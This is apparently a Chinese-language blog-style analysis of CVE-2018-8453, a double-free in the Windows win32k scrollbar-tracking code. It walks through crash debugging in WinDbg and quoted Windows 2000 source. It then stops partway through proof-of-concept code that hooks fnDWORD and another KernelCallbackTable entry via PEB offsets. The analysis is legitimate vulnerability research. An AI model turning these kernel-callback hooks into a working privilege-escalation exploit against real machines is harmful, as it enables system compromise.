CVE-2018-8453是一种UAF类型的漏洞，漏洞产生的原因是win32kfull!NtUserSetWindowFNID函数在对窗口对象设置FNID时没有检查窗口对象是否已经被释放，导致可以对一个已经被释放了的窗口设置一个新的FNID。通过利用win32kfull!NtUserSetWindowFNID的这一缺陷，可以控制窗口对象销毁时在xxxFreeWindow函数中回调fnDWORD的hook函数，从而可以在win32kfull!xxxSBTrackInit中实现对pSBTrack的Double
Free。
# 配置漏洞触发环境
    [+] win10 x64 1709
    [+] windbg preview 1.0.2001.02001
# BSOD分析
首先，我们将poc放入虚拟机中并运行，触发崩溃之后转到windbg中。先查看漏洞成因
程序试图释放一块已经释放了的pool，说明这是一个经典的Double Free漏洞。看一下这个pool的属性
这是一个0x80大小的session pool，划重点，这里后面要用到的。接着看一下调用关系
静态分析可知，win32kbase!Win32FreePool和win32kfull!Win32FreePoolImpl都是传递参数的工具人，将win32kfull!xxxSBTrackInit传入的参数传递给nt!ExFreePoolWithTag函数，所以我们还需要接着分析win32kfull!xxxSBTrackInit函数。
win32kfull!xxxSBTrackInit函数实现滚动条的鼠标跟随，当用户在一个滚动条按下左键（左键也是重点，后面会用）时，系统就会产生一个SBTrack结构保存用户鼠标的当前位置；用户松开鼠标时，系统会释放SBTrack结构。具体细节我们可以通过
Windows 2000 的源码来深入了解：
    pSBTrack = (PSBTRACK)UserAllocPoolWithQuota(sizeof(*pSBTrack), TAG_SCROLLTRACK);
    if (pSBTrack == NULL)
        return;
    pSBTrack->hTimerSB = 0;
    pSBTrack->fHitOld = FALSE;
    pSBTrack->xxxpfnSB = xxxTrackBox;
    pSBTrack->spwndTrack = NULL;
    pSBTrack->spwndSB = NULL;
    pSBTrack->spwndSBNotify = NULL;
    Lock(&pSBTrack->spwndTrack, pwnd);
    PWNDTOPSBTRACK(pwnd) = pSBTrack;
    pSBTrack->fCtlSB = (!curArea);pSBTrack = (PSBTRACK)UserAllocPoolWithQuota(sizeof(*pSBTrack), TAG_SCROLLTRACK);
    if (pSBTrack == NULL)
        return;
win32kfull!xxxSBTrackInit函数首先通过UserAllocPoolWithQuota函数申请一块内存来保存SBTrack的结构，将其保存在指针pSBTrack中，之后对SBTrack结构进行了一些初始化。
    xxxSBTrackLoop(pwnd, lParam, pSBCalc);
    while (ptiCurrent->pq->spwndCapture == pwnd) {
            if (!xxxGetMessage(&msg, NULL, 0, 0)) {
                // Note: after xxx, pSBTrack may no longer be valid
                break;
            }
            if (!_CallMsgFilter(&msg, MSGF_SCROLLBAR)) {
                cmd = msg.message;
                if (msg.hwnd == HWq(pwnd) && ((cmd >= WM_MOUSEFIRST && cmd = WM_KEYFIRST &&
                        cmd xxxpfnSB)))
                        // mode cancelled -- exit track loop
                        return;
                    (*xxxpfnSB)(pwnd, cmd, msg.wParam, msg.lParam, pSBCalc);
                } else {
                    xxxTranslateMessage(&msg, 0);
                    xxxDispatchMessage(&msg);
                }
            }
        }
接着调用xxxSBTrackLoop函数来循环处理用户的消息，该函数循环获取消息、判断消息、分发消息。当用户放开鼠标时，xxxSBTrackLoop停止追踪消息，退出之后释放pSBTrack指向的内存。
    // After xxx, re-evaluate pSBTrack
    REEVALUATE_PSBTRACK(pSBTrack, pwnd, "xxxTrackLoop");
    if (pSBTrack) {
        Unlock(&pSBTrack->spwndSBNotify);
        Unlock(&pSBTrack->spwndSB);
        Unlock(&pSBTrack->spwndTrack);
        UserFreePool(pSBTrack);
        PWNDTOPSBTRACK(pwnd) = NULL;
    }
xxxSBTrackLoop循环结束之后解引用了几个窗口的引用，然后释放掉pSBTrack指向的内存。
按理来说这里是不会报错的，以上这些操作都是正常流程，但double
free的错误提示说明在pSBTrack被win32kfull!xxxSBTrackInit释放之前已经被偷偷释放过一次了，在哪里我们不得而知，先尝试下一个内存访问断点。
    ba r8 ffff8d3dc1d2e9c0
断了几次都在申请内存的时候，最终，我们可以断在nt!ExFreePoolWithTag函数，该函数正打算释放pSTBrack，看起来和第二次释放没什么区别，但看一下堆栈就发现问题所在了。
这次释放发生在win32kbase!Win32FreePool释放pSBTrack之前，就是这次本不该发生的释放导致了Double
Free的发生。先看最上面标记出来的代码，这次是一个xxxEndScrell函数调用了Win32FreePool，该函数源码如下
    void xxxEndScroll(
        PWND pwnd,
        BOOL fCancel)
    {
        UINT oldcmd;
        PSBTRACK pSBTrack;
        CheckLock(pwnd);
        UserAssert(!IsWinEventNotifyDeferred());
        pSBTrack = PWNDTOPSBTRACK(pwnd);
        if (pSBTrack && PtiCurrent()->pq->spwndCapture == pwnd && pSBTrack->xxxpfnSB != NULL) {
            （省略部分内容）
            pSBTrack->xxxpfnSB = NULL;
            /*
             * Unlock structure members so they are no longer holding down windows.
             */
            Unlock(&pSBTrack->spwndSB);
            Unlock(&pSBTrack->spwndSBNotify);
            Unlock(&pSBTrack->spwndTrack);
            UserFreePool(pSBTrack);
            PWNDTOPSBTRACK(pwnd) = NULL;
        }
    }
只要我们能够通过if的判断，那么就能成功释放pSBTrack。因为程序是单线程，所以创建的窗口都是用的原来的SBTrack，自然而然的，pSBTrack和pSBTrack->xxxpfnSB
!= NULL都可以通过。至于PtiCurrent()->pq->spwndCapture == pwnd可以通过调用SetCapture函数来直接设置。
xxxEndScroll函数的作用我们已经知道了，接着继续循着调用路径追溯
    void xxxDWP_DoCancelMode(
        PWND pwnd)
    {
        （省略）
        if (pwndCapture == pwnd) {
            PSBTRACK pSBTrack = PWNDTOPSBTRACK(pwnd);
            if (pSBTrack && (pSBTrack->xxxpfnSB != NULL))
                xxxEndScroll(pwnd, TRUE);
        （省略）
继续往上追溯就到了win32kfull!xxxRealDefWindowProc。我们可以在对应的源码处看到一些有用的信息，如下
    LRESULT xxxDefWindowProc(
        PWND pwnd,
        UINT message,
        WPARAM wParam,
        LPARAM lParam)
    {
        （省略）
        case WM_CANCELMODE:
            {
                /*
                 * Terminate any modes the system might
                 * be in, such as scrollbar tracking, menu mode,
                 * button capture, etc.
                 */
                xxxDWP_DoCancelMode(pwnd);
            }
            break;
        （省略）
如果xxxDefWindowProc函数收到了WM_CANCELMODE，就可以去执行xxxEndScroll来释放SBTrack结构。
至此，我们对这个漏洞已经有一个初步认识了，大概有以下情报
    [+] 漏洞的成因是程序对一个0x80大小的session poll进行了两次释放
    [+] 第一次释放发生在poc的fnDWORDHook中，通过调用xxxEndScroll函数来实现
    [+] 第二次释放发生在xxxSBTrackInit函数，当xxxSBTrackLoop函数结束时会释放pSBTrack
# poc分析
## 创建窗口
    UINT CreateWindows(VOID) {
        HINSTANCE hInstance;
        WNDCLASS wndclass = { 0 };
        {
            hInstance = GetModuleHandleA(0);
            wndclass.style = CS_HREDRAW | CS_VREDRAW;
            wndclass.lpfnWndProc = DefWindowProc;
            wndclass.hInstance = hInstance;
            wndclass.cbClsExtra = 0x00;
            wndclass.cbWndExtra = 0x08;
            wndclass.lpszClassName = "case";
            if (!RegisterClassA(&wndclass)) {
                cout << "RegisterClass Error!" << endl;
                return 1;
            }
        }
        Window = CreateWindowExA(0, "case", NULL, WS_DISABLED, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        if (!Window) {
            cout << "Create Window Error!" << endl;
            return 1;
        }
        //保存句柄在扩展内存中
        SetWindowLongA(Window, 0, (ULONG)Window);
        //WS_CHILD |
        SrollBar = CreateWindowExA(0, "SCROLLBAR", NULL, WS_CHILD | WS_VISIBLE | SBS_HORZ, NULL, NULL, 2, 2, Window, NULL, hInstance, NULL);
        cout << "Window:0x" << hex << Window << endl;
        cout << "SrollBar:0x" << hex << SrollBar << endl;
    }
注册窗口类并产生一个主窗口，以主窗口为父窗口再创建一个滚动条子控件。只注意两个地方就可以了，`wndclass.cbWndExtra =
0x08`和`子窗口属性设置为WS_CHILD`，后面分析的时候会讲原因。
## 回调函数Hook
    //Windows10 1709 X64
    VOID Hook_Init(VOID) {
        DWORD OldType = 0;
        ULONG64 KernelCallbackTable = *(ULONG64*)(PEB + 0x58);
        VirtualProtect((LPVOID)KernelCallbackTable, 0x1024, PAGE_EXECUTE_READWRITE, &OldType);
        //fnDWORD
        fnDword = (My_FnFunction) * (ULONG64*)(KernelCallbackTable + 0x08 * 0x02);
        *(ULONG64*)(KernelCallbackTable + 0x08 * 0x02) = (ULONG64)fnDWORDHook;
        //xxxClientAllocWindowClassExtraBytes
        xxxClientAllocWindowClassExtraBytes = (My_FnFunction) * (ULONG64*)(KernelCallbackTable + 0x08 * 0x7E);
        //0x80
        *(ULONG64*)(KernelCallbackTable + 0x08 * 0x7E) = (ULONG64)xxxClientAllocWindowClassExtraBytesHook;
    }
首先获得KernelCallbackTable的地址，至于为什么是PEB+0x58，可以通过在windbg下`dt _PEB
@$peb`查看。VirtualProtect函数更改KernelCallbackTable表为可读可写可执行，这样我们可以直接通过赋值来修改其中的函数地址，这里我们修改了`fnDWORD`和`xxxClientAllocWindowClassExtraBytes`。
这两段代码是触发崩溃之前很重要的准备工作，但是有好多东西不明不白，你可能有以下问题
    [+] 为什么要hook fnDWORD和xxxClientAllocWindowClassExtraBytes？